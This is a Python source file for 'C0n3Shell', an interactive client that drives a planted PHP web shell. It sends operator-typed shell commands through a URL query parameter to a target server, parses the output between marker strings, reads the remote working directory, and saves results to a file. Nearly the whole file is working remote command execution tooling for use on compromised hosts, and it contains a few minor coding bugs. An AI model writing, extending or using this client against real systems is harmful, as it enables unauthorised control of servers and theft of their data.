from datetime import datetime
import requests
from urllib.parse import quote
from lxml import html
from cmd import Cmd

BANNER = """\033[01;32m\n
          __  _____ _____ _   _  _____   _____ _   _  _____ _      _      __
         / / /  __ \\  _  | \\ | ||____ | /  ___| | | ||  ___| |    | |     \\ \\
 ______ / /  | /  \\/ |/' |  \\| |    / / \\ `--.| |_| || |__ | |    | |      \\ \\ ______
|______< <   | |   |  /| | . ` |    \\ \\  `--. \\  _  ||  __|| |    | |       > >______|
        \\ \\  | \\__/\\ |_/ / |\\  |.___/ / /\\__/ / | | || |___| |____| |____  / /
         \\_\\  \\____/\\___/\\_| \\_/\\____/  \\____/\\_| |_/\\____/\\_____/\\_____/ /_/\033[0m\n
"""


class C0n3Shell(Cmd):
    _last_result = ''

    _headers = None
    _data = None

    # _Cookies=None
    _options = {
        'http_verb': 'get',
        'url': 'http://localhost/shell.php',
        'attribute': 'cmd',
        'raw': False,
        'show_stderr': True,
        'pwd': '',
        'marker': '[c3n0]',
        'ignore_certs': True
    }

    def __init__(
        self,
        http_verb='get',
        url='http://localhost/shell.php',
        attribute='cmd',
        ignore_certs=False,
        headers=None,
        data=None
        # ,
        # cookies=None
    ):

        self.updatePrompt()
        self._options['http_verb'] = http_verb.lower(
        ) if http_verb != None and len(http_verb) > 0 else 'get'
        self._options['url'] = url
        self._options['attribute'] = attribute
        self._options['ignore_certs'] = ignore_certs
        self._headers = headers
        self._data = data
        # self._Cookies=cookies
        self.banner()
        Cmd.__init__(self)
        self.showOptions(None)
        self.getPwd()

    def default(self, args):
        self.cmdHandler(args)

    def updatePrompt(self):
        self.prompt = '\033[01;32m{} - {} \033[0m> '.format(
            'c0n3', self._options['pwd'])

    def banner(self):
        print(BANNER)
        print('')

    def cmdHandler(self, cmd):
        if cmd != None and len(cmd) > 0 and cmd.startswith('!'):
            # internal commands
            cmdArray = cmd.split(' ')
            intCmd = cmdArray.pop(0)[1:]
            internal_command_handler = self._internal_commands.get(intCmd)
            if callable(internal_command_handler):
                internal_command_handler(self, ' '.join(cmdArray))
            else:
                print('[!] Unknown {}'.format(internal_command_handler))
        else:
            self._last_result=self.sendToShell(cmd)
            print(self._last_result)

    # Send command to webshell and display results
    def sendToShell(self, cmd):
        payload = cmd

        try:
            if self._options['show_stderr']:
                payload = '{} 2>&1'.format(payload)
            if not self._options['raw']:
                payload = 'echo \'{}\';{};echo \'{}\''.format(self._options['marker'], payload, self._options['marker'])

            print('[!] Sending payload: {}'.format(payload))
            response = requests.request(
                self._options['http_verb'],
                '{}?{}={}'.format(self._options['url'], self._options['attribute'], quote(payload)),
                headers=self._headers,
                data=self._data if self._options['http_verb'] in ['post,put'] else None
            )

            if response.status_code == 200:
                if self._options['raw']:
                    return response.text
                else:
                    result = response.text
                    try:
                        if result != None and len(result) > 0:
                            result = result[result.find(self._options['marker']) + len(self._options['marker']) + 1:]
                            result = result[:result.rfind(self._options['marker'])]
                        return result
                    except:
                        return response.text
            else:
                print('[!] Receive http code {}: {}').format(response.status_code, response.text)

        except Exception as ex:
            print('[!] Error: {}'.format(ex))

    def setOption(self, args):
        try:
            args = args.split(' ')
            self._options[args[0]] = args[1]
            print('[>] {}: {}'.format(args[0], args[1]))
        except Exception as ex:
            print('[!] Error: {}'.format(ex))
            print('[>] Usage: set option value')

    def showOptions(self, args):
        print('[>] options:')
        for name, value in self._options.items():
            print("\t{}: {}".format(name, value))

    def getPwd(self):
        path = self.sendToShell('pwd')
        path = '{}'.format(path)
        path = path.strip()
        if len(path) > 0:
            self._options['pwd'] = path

        self.updatePrompt()

    def dumpLastResult(self,args):
        if self._last_result == None and len(self._last_result) <= 0:
            print('[!] Last result empty, nothing to dump')
            return

        outputfile = './dump-{}.txt'.format(datetime.now())
        with open(outputfile,'w+') as of:
            of.write(self._last_result)
            of.close()
        print('[!] Last result saved in {}'.format(outputfile))

    def quitCmd(self, args):
        quit()

    def helpCmd(args):
        print('[?] Help: ')

    _internal_commands = {
        'dump': dumpLastResult,
        'help': helpCmd,
        'h': helpCmd,
        '?': helpCmd,
        'set':  setOption,
        'options': showOptions,
        # 'put':  uploadFileCmd,
        # 'get':  downloadFileCmd,
        'quit': quitCmd,
        'q': quitCmd
    }
